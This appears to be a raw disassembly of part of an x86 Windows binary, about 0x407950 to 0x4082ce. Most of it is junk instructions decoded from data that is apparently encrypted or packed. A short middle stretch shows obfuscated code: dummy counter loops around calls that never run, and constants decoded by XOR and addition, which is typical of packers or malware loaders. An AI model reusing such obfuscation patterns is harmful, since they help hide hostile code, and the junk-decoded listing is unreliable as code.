  40794b:	arpl   WORD PTR [esi-0x7a330404],bx
  407951:	push   eax
  407952:	hlt    
  407953:	push   0x52
  407955:	jo     0x4078f3
  407957:	ss push edx
  407959:	(bad)  
  40795a:	cmp    edi,eax
  40795c:	xchg   esi,eax
  40795d:	clc    
  40795e:	add    eax,DWORD PTR [ebx+eax*2+0x6c88d3a6]
  407965:	or     BYTE PTR [ebp+0x380bd634],dh
  40796b:	mov    esp,0xe79446cb
  407970:	data16 or al,0x57
  407973:	xor    al,0x49
  407975:	pop    esi
  407976:	sub    al,0x96
  407978:	inc    edx
  407979:	je     0x4079a3
  40797b:	pop    esp
  40797c:	and    DWORD PTR [ebx+0x2635cb28],esi
  407982:	test   eax,0xf0b34a5a
  407987:	mov    al,0x17
  407989:	sbb    BYTE PTR [ebp-0x1a1b9744],0x9a
  407990:	cmp    dh,dl
  407992:	hlt    
  407993:	xor    BYTE PTR [ebp+0x2c],ch
  407996:	or     al,0x4b
  407998:	(bad)  
  407999:	push   0xd90122e9
  40799e:	inc    edi
  40799f:	mov    al,ds:0xad8bb390
  4079a4:	adc    al,BYTE PTR [ebx+ebp*8+0x37537000]
  4079ab:	cmp    eax,edi
  4079ad:	mov    ebp,0x1dd75280
  4079b2:	out    0xcd,eax
  4079b4:	jns    0x40796a
  4079b6:	(bad)  
  4079b8:	inc    edx
  4079b9:	push   0x22b13041
  4079be:	sub    eax,0xb0ab0d74
  4079c3:	lahf   
  4079c4:	hlt    
  4079c5:	and    BYTE PTR [ebx+0x127e6801],bl
  4079cb:	test   al,0x66
  4079cd:	adc    ecx,DWORD PTR [ecx+0x63]
  4079d0:	mov    dl,BYTE PTR ds:0xdc3deefb
  4079d6:	dec    esi
  4079d7:	inc    edx
  4079d8:	into   
  4079d9:	mov    eax,0xeaf7f552
  4079de:	dec    esi
  4079df:	ja     0x40797b
  4079e1:	mov    bl,0xc1
  4079e3:	fwait
  4079e4:	shl    BYTE PTR [edi+eiz*8-0xa24b870],cl
  4079eb:	sbb    al,0x26
  4079ed:	or     eax,0x4b508cfc
  4079f2:	cli    
  4079f3:	sbb    al,0x20
  4079f5:	rcr    BYTE PTR [esi-0x1],cl
  4079f8:	mov    eax,ds:0xa5852560
  4079fd:	(bad)  
  4079fe:	jge    0x407998
  407a00:	push   ebp
  407a01:	mov    cl,0x70
  407a03:	sub    DWORD PTR [edi],ecx
  407a05:	xor    eax,0x9895c074
  407a0a:	cld    
  407a0b:	in     eax,0x66
  407a0d:	xchg   DWORD PTR [ebx*4-0x7f5687a],edi
  407a14:	dec    eax
  407a15:	pop    edx
  407a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a17:	test   eax,0x95f91c0a
  407a1c:	push   esp
  407a1d:	mov    edx,0x5b8c1286
  407a22:	ins    BYTE PTR es:[edi],dx
  407a23:	mov    ch,ah
  407a25:	test   al,0x30
  407a27:	mov    eax,0xff827cce
  407a2c:	xor    eax,0x43a38c
  407a31:	push   DWORD PTR ds:0x43a654
  407a37:	push   DWORD PTR [ebp-0x28]
  407a3a:	push   DWORD PTR [ebp-0x2c]
  407a3d:	mov    eax,DWORD PTR [ebp-0x14]
  407a40:	call   eax
  407a42:	mov    eax,DWORD PTR [ebp-0x30]
  407a45:	mov    ecx,DWORD PTR ds:0x43a350
  407a4b:	add    DWORD PTR [eax],ecx
  407a4d:	pop    edi
  407a4e:	pop    esi
  407a4f:	leave  
  407a50:	ret    
  407a51:	push   ebp
  407a52:	mov    ebp,esp
  407a54:	sub    esp,0x18
  407a57:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  407a5e:	lea    eax,[ebp+0x14]
  407a61:	adc    DWORD PTR ds:0x43501c,ecx
  407a67:	mov    DWORD PTR [ebp-0x4],eax
  407a6a:	adc    ecx,edx
  407a6c:	push   esi
  407a6d:	xor    ecx,0x4b84
  407a73:	mov    esi,0xf89c8585
  407a78:	xor    DWORD PTR ds:0x438014,edx
  407a7e:	mov    DWORD PTR [ebp-0xc],esi
  407a81:	lea    eax,[ebp-0xc]
  407a84:	adc    edx,ecx
  407a86:	mov    DWORD PTR [ebp-0x14],eax
  407a89:	mov    DWORD PTR ds:0x436014,0x1f
  407a93:	cmp    DWORD PTR ds:0x436014,0x0
  407a9a:	je     0x407ae5
  407aa0:	cmp    DWORD PTR ds:0x436014,0x6
  407aa7:	jg     0x407ae5
  407aad:	jmp    0x407abd
  407ab2:	push   0x43a097
  407ab7:	call   DWORD PTR ds:0x43a8d0
  407abd:	cmp    DWORD PTR ds:0x436014,0x7
  407ac4:	jne    0x407ad5
  407aca:	mov    eax,ds:0x436014
  407acf:	dec    eax
  407ad0:	mov    ds:0x436014,eax
  407ad5:	mov    eax,ds:0x436014
  407ada:	dec    eax
  407adb:	mov    ds:0x436014,eax
  407ae0:	jmp    0x407a93
  407ae5:	mov    eax,DWORD PTR [ebp-0xc]
  407ae8:	mov    edx,DWORD PTR [ebp-0x14]
  407aeb:	mov    ecx,0x751089b
  407af0:	xor    eax,ecx
  407af2:	add    eax,0x3272e2
  407af7:	adc    DWORD PTR ds:0x435010,0x438000
  407b01:	mov    DWORD PTR [edx],eax
  407b03:	sub    DWORD PTR ds:0x437008,0x436000
  407b0d:	mov    eax,ds:0x43a14c
  407b12:	sbb    DWORD PTR ds:0x43500c,ebx
  407b18:	mov    edx,DWORD PTR [ebp-0x4]
  407b1b:	or     DWORD PTR ds:0x435010,0x2376
  407b25:	mov    eax,DWORD PTR [eax]
  407b27:	add    DWORD PTR ds:0x434010,0x435010
  407b31:	add    eax,DWORD PTR [edx]
  407b33:	push   edi
  407b34:	mov    DWORD PTR [ebp-0x8],eax
  407b37:	mov    edi,DWORD PTR [ebp+0x8]
  407b3a:	and    DWORD PTR ds:0x438004,0x0
  407b44:	xor    edx,edx
  407b46:	xor    edx,DWORD PTR ds:0x438004
  407b4c:	inc    edx
  407b4d:	mov    DWORD PTR ds:0x438004,edx
  407b53:	cmp    DWORD PTR ds:0x438004,0x20
  407b5a:	jle    0x407b7d
  407b60:	jmp    0x407b70
  407b65:	push   0x43a111
  407b6a:	call   DWORD PTR ds:0x43a8d4
  407b70:	cmp    DWORD PTR ds:0x438004,0x11
  407b77:	jb     0x407b44
  407b7d:	mov    eax,ds:0x43a2d4
  407b82:	mov    eax,DWORD PTR [eax+0x198]
  407b88:	adc    DWORD PTR ds:0x43501c,0x6968
  407b92:	xor    edi,ecx
  407b94:	mov    edx,0x3272e2
  407b99:	add    edi,edx
  407b9b:	mov    DWORD PTR ds:0x434028,0x7d8d
  407ba5:	cmp    DWORD PTR [eax],edi
  407ba7:	mov    DWORD PTR ds:0x43500c,0x2ed0
  407bb1:	je     0x407bd2
  407bb7:	mov    DWORD PTR ds:0x43401c,0x771b
  407bc1:	mov    eax,DWORD PTR [eax]
  407bc3:	mov    DWORD PTR ds:0x434028,0x1ca1
  407bcd:	jmp    0x40a3ac
  407bd2:	mov    eax,DWORD PTR [ebp+0x18]
  407bd5:	cmp    eax,esi
  407bd7:	jne    0x407bf1
  407bdd:	mov    DWORD PTR ds:0x437010,0x6440
  407be7:	push   0xf89c8584
  407bec:	jmp    0x40a39b
  407bf1:	mov    esi,DWORD PTR [ebp+0x18]
  407bf4:	mov    eax,0xf89c85bb
  407bf9:	cmp    esi,eax
  407bfb:	jne    0x40a38b
  407c01:	sub    eax,esi
  407c03:	mov    eax,DWORD PTR [ebp+0x10]
  407c06:	xor    eax,ecx
  407c08:	mov    DWORD PTR ds:0x437008,0x10
  407c12:	cmp    DWORD PTR ds:0x437008,0x0
  407c19:	je     0x407c4c
  407c1f:	cmp    DWORD PTR ds:0x437008,0x12
  407c26:	jl     0x407c4c
  407c2c:	jmp    0x407c3a
  407c31:	push   DWORD PTR [ebp-0x18]
  407c34:	call   DWORD PTR ds:0x43a8dc
  407c3a:	mov    esi,DWORD PTR ds:0x437008
  407c40:	dec    esi
  407c41:	mov    DWORD PTR ds:0x437008,esi
  407c47:	jmp    0x407c12
  407c4c:	add    eax,edx
  407c4e:	and    DWORD PTR ds:0x43501c,0x0
  407c58:	jmp    0x407c6c
  407c5d:	xor    esi,esi
  407c5f:	or     esi,DWORD PTR ds:0x43501c
  407c65:	inc    esi
  407c66:	mov    DWORD PTR ds:0x43501c,esi
  407c6c:	cmp    DWORD PTR ds:0x43501c,0x1f
  407c73:	jae    0x407cc0
  407c79:	cmp    DWORD PTR ds:0x43501c,0x12
  407c80:	jg     0x407cc0
  407c86:	jmp    0x407ca1
  407c8b:	push   0x43a0c9
  407c90:	push   0x779d
  407c95:	push   DWORD PTR [ebp-0x18]
  407c98:	push   DWORD PTR [ebp-0x18]
  407c9b:	call   DWORD PTR ds:0x43a8e0
  407ca1:	cmp    DWORD PTR ds:0x43501c,0x11
  407ca8:	jne    0x407cbb
  407cae:	mov    esi,DWORD PTR ds:0x43501c
  407cb4:	inc    esi
  407cb5:	mov    DWORD PTR ds:0x43501c,esi
  407cbb:	jmp    0x407c5d
  407cc0:	mov    DWORD PTR [ebp-0x18],eax
  407cc3:	and    esi,esi
  407cc5:	mov    eax,DWORD PTR [ebp+0xc]
  407cc8:	mov    esi,DWORD PTR ds:0x437010
  407cce:	or     DWORD PTR ds:0x43600c,esi
  407cd4:	mov    esi,DWORD PTR [ebp-0x8]
  407cd7:	adc    DWORD PTR ds:0x43401c,0x438010
  407ce1:	xor    eax,ecx
  407ce3:	adc    DWORD PTR ds:0x435004,0x436008
  407ced:	add    eax,edx
  407cef:	xor    DWORD PTR ds:0x43501c,0x437018
  407cf9:	imul   eax,DWORD PTR [esi]
  407cfc:	mov    esi,DWORD PTR [ebp+0x8]
  407cff:	and    DWORD PTR ds:0x43700c,0x3cde
  407d09:	xor    esi,ecx
  407d0b:	sbb    DWORD PTR ds:0x437000,0x2ed1
  407d15:	add    esi,edx
  407d17:	mov    DWORD PTR ds:0x436004,0x2911
  407d21:	cmp    esi,eax
  407d23:	mov    eax,DWORD PTR [ebp-0x4]
  407d26:	mov    DWORD PTR ds:0x43501c,0x4044
  407d30:	push   ebx
  407d31:	mov    DWORD PTR ds:0x43600c,0x6dfa
  407d3b:	je     0x407e07
  407d41:	mov    DWORD PTR ds:0x435018,0x18
  407d4b:	cmp    DWORD PTR ds:0x435018,0x0
  407d52:	je     0x407db4
  407d58:	cmp    DWORD PTR ds:0x435018,0x8
  407d5f:	jb     0x407db4
  407d65:	jmp    0x407d88
  407d6a:	push   0x2a76
  407d6f:	push   0x436018
  407d74:	push   DWORD PTR [ebp-0xc]
  407d77:	push   0x43a01f
  407d7c:	push   DWORD PTR [ebp-0x24]
  407d7f:	push   DWORD PTR [ebp-0x24]
  407d82:	call   DWORD PTR ds:0x43a8e4
  407d88:	cmp    DWORD PTR ds:0x435018,0x9
  407d8f:	jne    0x407da2
  407d95:	mov    esi,DWORD PTR ds:0x435018
  407d9b:	dec    esi
  407d9c:	mov    DWORD PTR ds:0x435018,esi
  407da2:	mov    esi,DWORD PTR ds:0x435018
  407da8:	dec    esi
  407da9:	mov    DWORD PTR ds:0x435018,esi
  407daf:	jmp    0x407d4b
  407db4:	mov    esi,DWORD PTR [ebp-0x18]
  407db7:	add    DWORD PTR [eax],esi
  407db9:	mov    eax,DWORD PTR [ebp-0x4]
  407dbc:	mov    esi,DWORD PTR ds:0x43700c
  407dc2:	xor    esi,DWORD PTR ds:0x434008
  407dc8:	mov    DWORD PTR ds:0x43700c,esi
  407dce:	mov    esi,DWORD PTR [ebp+0xc]
  407dd1:	and    DWORD PTR ds:0x436010,0x434018
  407ddb:	xor    esi,ecx
  407ddd:	add    DWORD PTR ds:0x435018,0x43600c
  407de7:	add    esi,edx
  407de9:	xor    DWORD PTR ds:0x437014,0x43801c
  407df3:	imul   esi,DWORD PTR [eax]
  407df6:	mov    DWORD PTR ds:0x436018,0x6d68
  407e00:	mov    DWORD PTR [eax],esi
  407e02:	jmp    0x407e77
  407e07:	mov    DWORD PTR ds:0x435014,0x11
  407e11:	cmp    DWORD PTR ds:0x435014,0x0
  407e18:	je     0x407e72
  407e1e:	cmp    DWORD PTR ds:0x435014,0x6
  407e25:	ja     0x407e72
  407e2b:	jmp    0x407e46
  407e30:	push   DWORD PTR [ebp-0xc]
  407e33:	push   0x2134
  407e38:	push   DWORD PTR [ebp-0x24]
  407e3b:	push   0x8f99
  407e40:	call   DWORD PTR ds:0x43a8e8
  407e46:	cmp    DWORD PTR ds:0x435014,0x7
  407e4d:	jne    0x407e60
  407e53:	mov    ebx,DWORD PTR ds:0x435014
  407e59:	dec    ebx
  407e5a:	mov    DWORD PTR ds:0x435014,ebx
  407e60:	mov    ebx,DWORD PTR ds:0x435014
  407e66:	dec    ebx
  407e67:	mov    DWORD PTR ds:0x435014,ebx
  407e6d:	jmp    0x407e11
  407e72:	mov    esi,DWORD PTR [ebp+0x14]
  407e75:	xor    DWORD PTR [eax],esi
  407e77:	mov    eax,DWORD PTR [ebp-0x4]
  407e7a:	mov    edi,DWORD PTR [ebp+0x10]
  407e7d:	xor    edi,ecx
  407e7f:	mov    esi,0xffcd8d1e
  407e84:	mov    ebx,esi
  407e86:	sub    ebx,edi
  407e88:	add    DWORD PTR [eax],ebx
  407e8a:	mov    eax,DWORD PTR [ebp-0x4]
  407e8d:	mov    edi,DWORD PTR [ebp-0x8]
  407e90:	add    edi,DWORD PTR [eax]
  407e92:	mov    DWORD PTR [ebp-0x8],edi
  407e95:	mov    eax,DWORD PTR [ebp+0xc]
  407e98:	mov    edi,DWORD PTR [ebp+0xc]
  407e9b:	xor    edi,ecx
  407e9d:	xor    eax,ecx
  407e9f:	jmp    0x40a259
  407ea4:	lahf   
  407ea5:	(bad)  
  407ea6:	xchg   esp,eax
  407ea7:	jle    0x407e3d
  407ea9:	emms   
  407eab:	xchg   DWORD PTR [edi],ebp
  407ead:	jmp    0x2391:0xa6e0c670
  407eb4:	test   eax,0xd17c7c3a
  407eb9:	pop    edi
  407eba:	jl     0x407f38
  407ebc:	pushf  
  407ebd:	repnz pop edx
  407ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ec1:	xor    eax,0x8f188f17
  407ec6:	pushf  
  407ec7:	add    dh,bh
  407ec9:	pop    es
  407eca:	stos   DWORD PTR es:[edi],eax
  407ecb:	sub    al,0x23
  407ecd:	xchg   ecx,ebp
  407ecf:	mov    bh,0x87
  407ed1:	sub    al,0xec
  407ed3:	pop    ss
  407ed4:	retf   
  407ed5:	lock mov cl,0xa8
  407ed8:	xor    edi,DWORD PTR [ebp-0x4b6369a2]
  407ede:	ds dec esp
  407ee0:	shl    eax,1
  407ee2:	test   al,bl
  407ee4:	dec    esi
  407ee5:	pop    edx
  407ee6:	xchg   ebp,eax
  407ee7:	adc    ebx,edx
  407ee9:	sub    eax,0x5f590a7c
  407eee:	jae    0x407f01
  407ef0:	fs out dx,al
  407ef2:	adc    BYTE PTR [edx+0x42f17e14],al
  407ef8:	outs   dx,BYTE PTR fs:[esi]
  407efa:	shl    DWORD PTR [eax],cl
  407efc:	sbb    eax,0x9bd6080d
  407f01:	loop   0x407e8d
  407f03:	loopne 0x407ee4
  407f05:	fiadd  WORD PTR [edi]
  407f07:	cmp    BYTE PTR [eax+ebp*4+0x1d],0xe7
  407f0c:	jae    0x407e92
  407f0e:	shl    BYTE PTR [edi+ecx*4],0xcd
  407f12:	and    dl,BYTE PTR [eax+edi*2]
  407f15:	push   ecx
  407f16:	ret    
  407f17:	push   ebp
  407f18:	push   edx
  407f19:	retf   0x2312
  407f1c:	mov    ah,0xa
  407f1e:	loopne 0x407f8d
  407f20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f21:	rol    DWORD PTR [ebp-0x6],cl
  407f24:	jle    0x407fa0
  407f26:	mov    edi,0x5b381a17
  407f2b:	sti    
  407f2c:	dec    esp
  407f2d:	out    0xc3,al
  407f2f:	aaa    
  407f30:	sub    ebp,edi
  407f32:	jge    0x407ee8
  407f34:	cwde   
  407f35:	stc    
  407f36:	(bad)
  407f39:	or     ecx,DWORD PTR [ecx]
  407f3b:	addr16 jmp 0xae8cc163
  407f41:	inc    ebp
  407f42:	pushf  
  407f43:	fwait
  407f44:	(bad)  
  407f45:	jp     0x407edf
  407f47:	nop
  407f48:	hlt    
  407f49:	or     al,0x34
  407f4b:	call   0x14fa:0xde686c40
  407f52:	push   edi
  407f53:	inc    ebp
  407f54:	jns    0x407fb9
  407f56:	push   es
  407f57:	push   0x512b989d
  407f5c:	stc    
  407f5d:	mov    edx,0x66a3f1e3
  407f62:	jb     0x407f96
  407f64:	sub    eax,DWORD PTR [edx]
  407f66:	xor    eax,0x9fca0245
  407f6b:	test   al,0xad
  407f6d:	pop    eax
  407f6e:	popf   
  407f6f:	inc    ebp
  407f70:	and    al,0x23
  407f72:	js     0x407f5e
  407f74:	and    eax,0xcf097d6d
  407f79:	xchg   esi,eax
  407f7a:	dec    ebp
  407f7b:	repz mov edi,0xa2511c70
  407f81:	ja     0x407f97
  407f83:	push   edi
  407f84:	pop    ss
  407f85:	jl     0x407f18
  407f87:	jae    0x407f55
  407f89:	jne    0x407f2b
  407f8b:	out    dx,eax
  407f8c:	jo     0x407fb1
  407f8e:	pop    es
  407f8f:	cmc    
  407f90:	sub    ebp,DWORD PTR [ecx+0x1d2d90]
  407f96:	retf   0xddba
  407f99:	xor    BYTE PTR [esi-0x55],bl
  407f9c:	inc    esp
  407f9d:	das    
  407f9e:	mov    al,0x86
  407fa0:	or     ebx,DWORD PTR [esi]
  407fa2:	shl    DWORD PTR [ebx],1
  407fa4:	(bad)  
  407fa5:	jae    0x40800d
  407fa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fa8:	shl    BYTE PTR [edi+0x6b],0x12
  407fac:	call   0x63d16925
  407fb1:	mov    DWORD PTR [ecx],esp
  407fb3:	sub    esp,DWORD PTR [ebp-0x1fe4f44f]
  407fb9:	sbb    DWORD PTR [ecx-0x5adb33d5],0x6a
  407fc0:	in     al,dx
  407fc1:	pop    ecx
  407fc2:	test   eax,0xd840da54
  407fc7:	or     al,al
  407fc9:	pop    eax
  407fca:	ins    BYTE PTR es:[edi],dx
  407fcb:	xchg   cl,dh
  407fcd:	jno    0x407f51
  407fcf:	rcr    BYTE PTR [edx+0xfde4589],cl
  407fd5:	in     al,0x5c
  407fd7:	pushf  
  407fd8:	adc    DWORD PTR [edx+0x72],0x7
  407fdc:	dec    edi
  407fdd:	sbb    edi,DWORD PTR [ebx]
  407fdf:	rcl    DWORD PTR [ecx],1
  407fe1:	cwde   
  407fe2:	sbb    DWORD PTR [ebx-0x8de5f10],ebp
  407fe8:	mov    esp,edx
  407fea:	xchg   BYTE PTR [ecx+esi*4],bl
  407fed:	clc    
  407fee:	in     al,dx
  407fef:	xchg   DWORD PTR [ebx],esi
  407ff1:	sbb    al,0x49
  407ff3:	jae    0x407fa8
  407ff5:	loop   0x408054
  407ff7:	scas   eax,DWORD PTR es:[edi]
  407ff8:	pop    ebp
  407ff9:	loope  0x407f85
  407ffb:	pushf  
  407ffc:	adc    al,ch
  407ffe:	jmp    0x40805b
  408000:	and    DWORD PTR gs:[eax],esp
  408003:	jo     0x407fa8
  408005:	mov    ds:0x25bad7d8,al
  40800a:	inc    edx
  40800b:	or     eax,0x202afc75
  408010:	inc    eax
  408011:	adc    bh,0x55
  408014:	sbb    ecx,ebp
  408016:	dec    ebp
  408017:	jne    0x408080
  408019:	sbb    esp,DWORD PTR [edx-0x4ff6411f]
  40801f:	xlat   BYTE PTR ds:[ebx]
  408020:	fsubp  st(3),st
  408022:	enter  0x3346,0xb3
  408026:	popf   
  408027:	sub    edi,DWORD PTR [ebp-0x63]
  40802a:	add    ah,bl
  40802c:	out    dx,eax
  40802d:	addr16 cmp eax,0x67a8cc89
  408033:	xor    eax,0x49a1c87f
  408038:	lods   al,BYTE PTR ds:[esi]
  408039:	out    dx,al
  40803a:	(bad)  
  40803b:	pop    esp
  40803c:	out    0xa0,al
  40803e:	call   FWORD PTR ds:0x37361318
  408044:	fs leave 
  408046:	loopne 0x40804a
  408048:	shl    bh,1
  40804a:	outs   dx,BYTE PTR ds:[esi]
  40804b:	leave  
  40804c:	call   0x620b:0xfb372a7e
  408053:	xor    al,0xf6
  408055:	mov    DWORD PTR [esi],ebx
  408057:	pop    esp
  408058:	cwde   
  408059:	pop    edi
  40805a:	push   cs
  40805b:	aas    
  40805c:	daa    
  40805d:	dec    edi
  40805e:	and    DWORD PTR [ebx+0x6a],0x0
  408062:	fild   DWORD PTR [ebx]
  408064:	pop    edx
  408065:	sbb    DWORD PTR [edi+eax*2],ebp
  408068:	mov    edi,0xfc5092f4
  40806d:	xchg   BYTE PTR [ebp*2-0x7cbd93dc],al
  408074:	inc    ecx
  408075:	jg     0x408098
  408077:	push   ds
  408078:	or     BYTE PTR [edi+eax*8-0xd1c49e6],bl
  40807f:	les    ebx,FWORD PTR [edx]
  408081:	push   eax
  408082:	push   0x1ea54fbb
  408087:	pop    ds
  408088:	jmp    0xd9995aa
  40808d:	les    ecx,FWORD PTR [ebx+edx*8-0x3ea9d20a]
  408094:	or     DWORD PTR [eax+ebp*2],eax
  408097:	xor    BYTE PTR [eax-0x482a12e7],al
  40809d:	add    DWORD PTR [eax],ebp
  40809f:	clc    
  4080a0:	pop    es
  4080a1:	popa   
  4080a2:	jb     0x408097
  4080a4:	fbld   TBYTE PTR [ebp+0x556bdcdc]
  4080aa:	xchg   edi,eax
  4080ab:	cmc    
  4080ac:	dec    edi
  4080ad:	call   0xccd2:0xd7ee9fbd
  4080b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080b5:	cmp    DWORD PTR [ecx],esp
  4080b7:	movhps QWORD PTR [edi],xmm7
  4080ba:	sub    ah,ch
  4080bc:	stc    
  4080bd:	push   ds
  4080be:	sub    al,0xa6
  4080c0:	dec    edx
  4080c1:	(bad)  
  4080c2:	clc    
  4080c3:	mov    esi,0xa535f32b
  4080c8:	push   edx
  4080c9:	(bad)  
  4080ca:	cdq    
  4080cb:	pop    ds
  4080cc:	add    ebp,esi
  4080ce:	jne    0x4080b1
  4080d0:	lds    ebx,FWORD PTR [ebp-0x608288d5]
  4080d6:	or     dl,BYTE PTR [esi]
  4080d8:	adc    al,0x42
  4080da:	int3   
  4080db:	cwde   
  4080dc:	add    al,al
  4080de:	pop    ebx
  4080df:	cmp    DWORD PTR [eax],0xe
  4080e2:	cs inc edx
  4080e4:	jbe    0x4080e9
  4080e6:	jg     0x4080e8
  4080e8:	mov    esi,0xcb227d88
  4080ed:	pop    es
  4080ee:	and    ebp,DWORD PTR [ebx-0x37]
  4080f1:	push   cs
  4080f2:	out    dx,al
  4080f3:	(bad)  
  4080f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080f5:	test   al,0x61
  4080f7:	xchg   edx,eax
  4080f8:	mov    ebp,0x3900e851
  4080fd:	pop    edx
  4080fe:	mov    ebp,0x591a15a3
  408103:	inc    edx
  408104:	mov    edx,0x75b55604
  408109:	(bad)
  40810d:	sbb    al,0xc3
  40810f:	add    DWORD PTR [edx+0x70],edi
  408112:	popa   
  408113:	mov    ds:0xe3e8ef7a,al
  408118:	lea    edi,[ebp+0x56]
  40811b:	push   esi
  40811c:	pop    esi
  40811d:	xchg   ebp,edi
  40811f:	cmp    al,0x90
  408121:	gs js  0x408131
  408124:	adc    al,0x72
  408126:	mov    edi,ebp
  408128:	sbb    ebx,DWORD PTR [ebx+ebx*8-0x7a]
  40812c:	mov    al,0x4d
  40812e:	pop    esp
  40812f:	mov    esp,0x3665e49f
  408134:	cmp    eax,0xb9870578
  408139:	ss pop ebp
  40813b:	addr16 push eax
  40813d:	test   eax,0xb6fe9b84
  408142:	mov    ecx,0x3a00f571
  408147:	sbb    bl,0x2c
  40814a:	cmp    eax,0xacccd51
  40814f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408150:	pop    ds
  408151:	sub    esi,DWORD PTR [ebx]
  408153:	dec    ebp
  408154:	inc    eax
  408155:	and    DWORD PTR [edi+eiz*1-0x22],edi
  408159:	out    0x2a,eax
  40815b:	and    eax,0x1ab109da
  408160:	stc    
  408161:	mov    eax,ds:0x939a3693
  408166:	dec    ebp
  408167:	xchg   ebx,eax
  408168:	jge    0x4081d3
  40816a:	mov    ebp,0x5a41ad93
  40816f:	sub    eax,0xf84efa7
  408174:	outs   dx,BYTE PTR ds:[esi]
  408175:	xchg   ecx,eax
  408176:	cdq    
  408177:	mov    ah,0x52
  408179:	cmp    DWORD PTR [esi],ebx
  40817b:	addr16 mov ebx,0x843b2ca
  408181:	nop
  408182:	int3   
  408183:	ret    
  408184:	and    esp,DWORD PTR [ecx+edx*4-0x1f4f1632]
  40818b:	stos   BYTE PTR es:[edi],al
  40818c:	fild   DWORD PTR [edi+esi*1+0x69]
  408190:	loopne 0x4081f8
  408192:	mov    dh,0x26
  408194:	iret   
  408195:	lahf   
  408196:	sub    bl,ch
  408198:	and    edi,ebx
  40819a:	adc    eax,0x2358e5a2
  40819f:	xor    eax,0x30f265da
  4081a4:	inc    edi
  4081a5:	fsubp  st(5),st
  4081a7:	les    eax,FWORD PTR [esi+0x4]
  4081aa:	lea    esp,[esi-0x6b]
  4081ad:	sbb    edx,edx
  4081af:	mov    al,0xe1
  4081b1:	inc    esi
  4081b2:	dec    edi
  4081b3:	cli    
  4081b4:	xor    DWORD PTR [ebx+0x4f],eax
  4081b7:	cld    
  4081b8:	das    
  4081b9:	psllq  mm0,QWORD PTR [edi+0xa]
  4081bd:	sahf   
  4081be:	into   
  4081bf:	stos   DWORD PTR es:[edi],eax
  4081c0:	pop    ebx
  4081c1:	mov    dh,0x10
  4081c3:	ds push ecx
  4081c5:	push   0x42
  4081c7:	sbb    ah,BYTE PTR ds:0xa79bdd7
  4081cd:	xor    bl,0xca
  4081d0:	xchg   esi,eax
  4081d1:	je     0x4081b8
  4081d3:	(bad)  
  4081d4:	imul   edi,DWORD PTR [ecx],0x4d
  4081d7:	retf   
  4081d8:	or     DWORD PTR [edx],ebx
  4081da:	cmp    BYTE PTR [ebp-0x5c8a3dfb],al
  4081e0:	fidivr WORD PTR [ebx+0x1c452a85]
  4081e6:	out    0xe6,eax
  4081e8:	xchg   edx,eax
  4081e9:	psubusw mm1,mm6
  4081ec:	scas   eax,DWORD PTR es:[edi]
  4081ed:	sbb    ah,BYTE PTR [esi]
  4081ef:	sub    ebx,esi
  4081f1:	xchg   edi,eax
  4081f2:	in     eax,0xeb
  4081f4:	sbb    BYTE PTR [esi-0x72],dl
  4081f7:	aas    
  4081f8:	ret    0x8d6e
  4081fb:	xchg   ebp,eax
  4081fc:	into   
  4081fd:	jbe    0x4081dd
  4081ff:	and    DWORD PTR ds:0xe38c24aa,0xb78fc84f
  408209:	fsub   QWORD PTR [edx]
  40820b:	adc    esp,ecx
  40820d:	pop    esp
  40820e:	ss fs push ecx
  408211:	mov    WORD PTR [ebp+eiz*2+0x51158ee9],?
  408218:	cmp    al,0xb5
  40821a:	lea    esp,[ecx-0x4c8c8daf]
  408220:	aam    0x36
  408222:	cwde   
  408223:	xchg   edx,eax
  408224:	mov    bl,ah
  408226:	hlt    
  408227:	repz mov ebx,0xfb68dff1
  40822d:	dec    ebx
  40822e:	jp     0x4081d0
  408230:	or     DWORD PTR [ecx+edi*2+0x19277fde],ebp
  408237:	and    eax,0xb1973684
  40823c:	les    edx,FWORD PTR [edx+0x31]
  40823f:	sub    al,0x19
  408241:	adc    DWORD PTR [edx-0x1c],ebp
  408244:	xor    ecx,DWORD PTR [edi+ebp*1]
  408247:	pop    eax
  408248:	cmp    al,0xd6
  40824a:	mov    bh,0x29
  40824c:	pop    ds
  40824d:	out    dx,eax
  40824e:	jnp    0x40823f
  408250:	aad    0xdc
  408252:	ficom  DWORD PTR ds:0x2cd5b404
  408258:	sbb    edi,DWORD PTR [ebp-0x79acd89f]
  40825e:	test   dh,cl
  408260:	or     BYTE PTR [edi+0x3b],bh
  408263:	mov    bl,0x2a
  408265:	repnz std 
  408267:	ds pop ebp
  408269:	push   cs
  40826a:	dec    eax
  40826b:	adc    al,0xef
  40826d:	shl    ecx,cl
  40826f:	pushf  
  408270:	inc    ebx
  408271:	pop    edi
  408272:	pop    edx
  408273:	dec    ebx
  408274:	xchg   esp,eax
  408275:	pop    esp
  408276:	mov    al,0x9e
  408278:	aaa    
  408279:	mov    edx,0xefadb030
  40827e:	pop    ebp
  40827f:	xor    al,0x80
  408281:	jmp    0x4082f1
  408283:	jb     0x40823a
  408285:	mov    al,0xe9
  408287:	xchg   ecx,eax
  408288:	cmp    ebp,eax
  40828a:	rol    bl,1
  40828c:	jnp    0x40824a
  40828e:	mov    ch,0x1
  408290:	or     DWORD PTR [eax+0x9],ebp
  408293:	cmp    al,0xa
  408295:	rol    BYTE PTR [eax-0xf],0x6c
  408299:	or     BYTE PTR [edx-0x6ccb570f],cl
  40829f:	rcr    DWORD PTR ds:0xa5b07584,0x99
  4082a6:	jl     0x40828b
  4082a8:	sbb    eax,0xee7b230
  4082ad:	aas    
  4082ae:	ins    BYTE PTR es:[edi],dx
  4082af:	sete   BYTE PTR [esi]
  4082b2:	mov    ds,eax
  4082b4:	aam    0x31
  4082b6:	adc    esp,DWORD PTR [ebx]
  4082b8:	cld    
  4082b9:	xchg   esi,eax
  4082ba:	adc    dh,cl
  4082bc:	dec    esi
  4082bd:	ja     0x408246
  4082bf:	push   ebx
  4082c0:	test   al,0xad
  4082c2:	adc    eax,0xf84635a7
  4082c7:	popa   
  4082c8:	jo     0x408250
  4082ca:	lahf   
  4082cb:	sahf   
  4082cc:	hlt    
  4082cd:	fwait
  4082ce:	xchg   edx,eax
